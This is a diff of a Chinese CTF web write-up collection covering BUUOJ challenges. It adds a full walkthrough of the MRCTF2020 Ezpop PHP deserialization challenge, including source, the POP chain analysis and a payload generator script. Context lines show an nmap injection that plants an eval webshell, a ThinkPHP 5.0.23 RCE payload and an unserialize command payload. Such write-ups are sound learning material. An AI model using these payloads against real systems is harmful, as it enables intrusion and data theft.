@@ -20,7 +20,7 @@ by:gyy
 
 ---
 
-# [CSAWQual 2016]i_got_id
+## [CSAWQual 2016]i_got_id
 
 ![image-20201129165730787](Buuoj-WEB-Write-up/image-20201129165730787.png)
 
@@ -69,7 +69,7 @@ ARGV------命令行参数
 
 
 
-# [DDCTF 2019]homebrew event loop
+## [DDCTF 2019]homebrew event loop
 
 ![image-20201129170732360](Buuoj-WEB-Write-up/image-20201129170732360.png)
 
@@ -323,7 +323,7 @@ flag即在其中
 
 ---
 
-# [GWCTF 2019]枯燥的抽奖
+## [GWCTF 2019]枯燥的抽奖
 
 ![image-20201129181539620](Buuoj-WEB-Write-up/image-20201129181539620.png)
 
@@ -410,7 +410,7 @@ print (res)
 
 
 
-# [N1CTF 2018]eating_cms
+## [N1CTF 2018]eating_cms
 
 打开就是登陆界面
 
@@ -795,7 +795,7 @@ flag即在`flag_233333`
 
 ---
 
-# [Black Watch 入群题]Web
+## [Black Watch 入群题]Web
 
 打开
 
@@ -986,7 +986,7 @@ payload：
 
 
 
-# [SUCTF 2019]CheckIn
+## [SUCTF 2019]CheckIn
 
 ##### 文件上传
 
@@ -1041,7 +1041,7 @@ ok,再传码
 
 
 
-# [RoarCTF 2019]Easy Java
+## [RoarCTF 2019]Easy Java
 
 记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。
 
@@ -1087,7 +1087,7 @@ WEB-INF主要包含一下文件或目录:
 
 
 
-# [BUUCTF 2018]Online Tool
+## [BUUCTF 2018]Online Tool
 
 nmap工具的利用
 
@@ -1176,7 +1176,7 @@ payload=`./?host='<?php eval($_POST[gyy]);?> -oG shell.php '`
 
 
 
-# [GKCTF2020]cve版签到
+## [GKCTF2020]cve版签到
 
 #####  cve-2020-7066 
 
@@ -1204,7 +1204,7 @@ payload=`./?host='<?php eval($_POST[gyy]);?> -oG shell.php '`
 
 
 
-# [GXYCTF2019]禁止套娃
+## [GXYCTF2019]禁止套娃
 
 git泄露
 
@@ -1315,7 +1315,7 @@ readfile()
 
 ----
 
-# [BJDCTF 2nd]old-hack
+## [BJDCTF 2nd]old-hack
 
 ##### thinkphp5.0.23 远程代码执行 漏洞
 
@@ -1331,7 +1331,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
 
 
 
-# [网鼎杯 2020 朱雀组]phpweb
+## [网鼎杯 2020 朱雀组]phpweb
 
 ![image-20201210190510038](Buuoj-WEB-Write-up/image-20201210190510038.png)
 
@@ -1428,7 +1428,7 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func
 
 
 
-# [BJDCTF 2nd]假猪套天下第一
+## [BJDCTF 2nd]假猪套天下第一
 
 ##### Http Header
 
@@ -1514,7 +1514,7 @@ Via: y1ng.vip
 
 
 
-# [BJDCTF2020]Cookie is so stable
+## [BJDCTF2020]Cookie is so stable
 
 ##### SSTI模板注入
 
@@ -1544,7 +1544,7 @@ ID测试，不是SQL注入，测试`{{1+1}}`
 
 
 
-# [SWPU2019]Web1
+## [SWPU2019]Web1
 
 注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入
 
@@ -1613,4 +1613,228 @@ ID测试，不是SQL注入，测试`{{1+1}}`
 将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接`group_concat(a)`可得结果
 
 ![image-20201213175809048](Buuoj-WEB-Write-up/image-20201213175809048.png)
+
+
+
+----
+
+## [MRCTF2020]Ezpop
+
+##### 反序列化
+
+先上源码
+
+```php
+Welcome to index.php
+<?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    @unserialize($_GET['pop']);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}
+```
+
+三个类
+
+`Modifier`，`Show`，`Test`
+
+逐个分析，首先路口题目给了从`Show`，可能不对，但还是先从`Show`看
+
+```php
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+```
+
+三个魔术方法
+
+```php
+__construct：当一个对象创建时调用
+__toString：当一个对象被当作一个字符串被调用
+__wakeup：反序列化时触发
+```
+
+从`Show`入口，会调用`__wakeup`魔术方法，方法里将`$this->source`做字符串在`preg_match`函数里比较， 如果`$this->source`是Show类，这时会调用`__toString`方法。
+
+
+
+再看`Modifier`
+
+```php
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+```
+
+一个魔术方法
+
+```
+__invoke：将对象调用为函数时触发
+```
+
+很明显的文件包含`include`，这个类就是最终要读取`flag.php`的时候使用的了，我们要让`Modifier`被当做函数调用，这时就会调用`__invoke`方法，从而调用`append`函数，进行文件包含。
+
+
+
+最后看`Test`
+
+```php
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+```
+
+两个魔术方法
+
+```
+__construct：当一个对象创建时调用
+__get：用于从不可访问的属性读取数据
+```
+
+很关键的`__get`魔术方法，这里会返回`$this->p`即`$function()`作为函数调用，而我们恰好需要让`Modifier`被当做函数调用，只要在`Show`里实例化`Test`类，这样一来一条pop链就形成了。
+
+###### pop链
+
+从`Show`入手，先反序列化函数触发`Show`类中`__wakeup`方法，方法内调用函数触发`__tosring`方法，`__tosring`中将`str`实例化为`Test`类，而`Test`类中没有`source`属性，所以会调用`__get`方法， 将`function`实例化为`Modifier`类，触发`Modifier`中的`__invoke`方法，最终调用`include`函数文件包含`flag.php`
+
+
+
+payload:
+
+```php
+<?php
+class Modifier {
+    protected $var="php://filter/convert.base64-encode/resource=flag.php";
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file){
+        $this->source = $file;
+    }
+    public function __toString(){
+        return "123";
+    }
+
+}
+
+class Test{
+    public $p;
+}
+
+//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"
+
+$b = new Show("123");
+$b->str = new Test();
+$b->str->p = new Modifier();
+$c = new Show($b);
+
+echo serialize($c)."\r\n";
+//O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
+
+echo urlencode(serialize($c));
+//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
+
+```
+
+这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于`protected`与`public`类别还是敏感的，可以看到这里是有`%00`存在的
+
+![image-20201218135255308](Buuoj-WEB-Write-up/image-20201218135255308.png)
+
+可见字符4个，前后都是`%00`，这时通过数据表传参可能会不准确，例如我本地调会显示如下
+
+![image-20201218135449017](Buuoj-WEB-Write-up/image-20201218135449017.png)
+
+![image-20201218135521199](Buuoj-WEB-Write-up/image-20201218135521199.png)
+
+![image-20201218135543020](Buuoj-WEB-Write-up/image-20201218135543020.png)
+
+所以我们最后进行`urlencode`，保证`%00`正常传入
+
+![image-20201218135722862](Buuoj-WEB-Write-up/image-20201218135722862.png)
+
+最后包含`flag.php`，拿到flag
+
+
+
+---
+
+
 
